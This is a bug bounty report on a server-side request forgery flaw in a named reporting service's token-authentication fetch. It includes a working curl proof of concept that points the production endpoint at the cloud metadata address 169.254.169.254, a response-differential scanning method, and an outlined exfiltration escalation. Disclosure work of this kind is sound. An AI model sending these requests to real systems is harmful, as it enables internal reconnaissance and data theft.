# SSRF via API Bridge "Dynamic Bearer Token → Token Authentication URL" (second unvalidated fetch path)

**Program:** Two Minute Reports — Bug Bounty / VDP
**Target asset:** `https://hub.twominutereports.com`
**Vulnerability class:** Server-Side Request Forgery (SSRF) — CWE-918
**Severity:** **High** — CVSS 3.1 **8.6** — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N`
**Status:** Confirmed (differential proof)
**Relationship:** **Same root cause as Finding #1** (API Bridge performs server-side fetches of user-supplied URLs with no egress validation). This report documents a **second, independent code path** so the fix covers all of them. Can be triaged as one issue.

---

## 1. Summary

The API Bridge connector supports a **"Dynamic Bearer Token"** authorization mode. In this mode the Two Minute Reports backend first makes a **server-side request to a user-supplied "Token Authentication URL"** (`dynamicTokenAuthSuffixUrl`, appended to `baseUrl`) to mint an access token, then makes the data request.

This **token-minting fetch is a separate SSRF sink** from the data fetch in Finding #1, and it is **equally unvalidated** — it will connect to internal, link-local, and loopback destinations. It was confirmed reaching the cloud metadata service at `169.254.169.254`.

Because a single user-controlled `baseUrl`/suffix drives the fetch, and no scheme/host/IP filtering is applied, any authenticated user (free trial, or a `tmrc_live_` API key) can force the backend to issue requests to internal network destinations via this path.

---

## 2. Affected component

| Item | Value |
|---|---|
| Endpoint | `POST https://hub.twominutereports.com/rmtipa/platform/test-connection` |
| Mode | `"authorization":"dynamicBearerToken"` |
| Vulnerable field | `dynamicTokenAuthSuffixUrl` (fetched server-side, appended to `baseUrl`) |
| Auth required | User session token **or** `tmrc_live_` API key (free trial sufficient) |
| Persistence | None (`isApibridgeTestConnection:true` is a probe) |

---

## 3. Proof of Concept (differential — proves the token URL is fetched server-side and reaches internal)

Both requests set `baseUrl=http://169.254.169.254` and drive the **token-auth** fetch via `dynamicTokenAuthSuffixUrl`. The two different internal responses prove the request left TMR's backend and hit the internal metadata service.

**A) Reachable internal path → HTTP 200 body returned (no `access_token` field in the YAML):**
```bash
curl -s 'https://hub.twominutereports.com/rmtipa/platform/test-connection' \
 -H 'Authorization: Bearer <TOKEN-or-tmrc_live_key>' -H 'Content-Type: application/json' \
 --data '{"connection":{"name":"p","baseUrl":"http://169.254.169.254","authorization":"dynamicBearerToken","isApibridgeTestConnection":true,"headers":[],"dynamicTokenAuthSuffixUrl":"/hetzner/v1/metadata","dynamicTokenPath":"access_token","tokenHeader":"Authorization: Bearer {{token}}","dynamicTokenMethod":"get","query":{"method":"get","urlSuffix":"/hetzner/v1/metadata"},"dataSourceType":"apibridge"}}'
```
→ `{"code":"VALIDATION_FAILED","message":"Unable to find the dynamic access token in the response",...}`
(The server fetched the metadata document — a 200 with a body — but couldn't locate the `access_token` JSON field in it.)

**B) Same internal host, non-existent path → the internal service's own 404:**
```bash
# ...identical, but dynamicTokenAuthSuffixUrl="/nonexistent-xyz"
```
→ `{"code":"CONNECTION_CREDENTIALS_MISSING","message":"Error 404, Not Found...",...}`

**Interpretation:** `200-with-body` for the real metadata path vs `404` for a bogus path — **both from `169.254.169.254`** — confirms the token-auth fetch reaches internal link-local destinations. (See `evidence-tokenauth-ssrf.txt`.)

---

## 4. Impact

- Confirms the SSRF is **not limited to the single data-fetch code path** — the token-auth fetch is a second sink with identical lack of validation. A partial fix that only guards the data URL would leave this exploitable.
- Usable as a **blind SSRF for internal reconnaissance / port- and service-scanning** via response differentials (`200 body` vs `404` vs connection-refused vs timeout).
- **Escalation (noted, not weaponised):** the value extracted by `dynamicTokenPath` from the token-auth response is injected into `tokenHeader` and sent on the *data* request. Pointing the token-auth fetch at an internal **JSON** endpoint and the data fetch at an attacker-controlled host would let a specific internal field value be **exfiltrated in-band** — turning this path into a read primitive for internal JSON services and an outbound exfiltration channel.

---

## 5. Remediation

Apply the **same egress validation as Finding #1** to the `dynamicTokenAuthSuffixUrl` fetch (and any other server-side fetch in the connector): allow only `http(s)`, reject private/link-local/loopback/reserved IPs after DNS resolution, re-validate on redirects. Centralise all outbound-fetch construction behind one hardened HTTP client so every code path is covered.

---

## 6. Reference schema (Dynamic Bearer Token)

```json
{"connection":{
  "name":"API Bridge",
  "baseUrl":"<attacker-controlled>",
  "authorization":"dynamicBearerToken",
  "isApibridgeTestConnection":true,
  "headers":[],
  "dynamicTokenAuthSuffixUrl":"<attacker-controlled — fetched server-side>",
  "dynamicTokenPath":"access_token",
  "tokenHeader":"Authorization: Bearer {{token}}",
  "dynamicTokenMethod":"get",
  "query":{"method":"get","urlSuffix":"<attacker-controlled>"},
  "dataSourceType":"apibridge"
}}
```
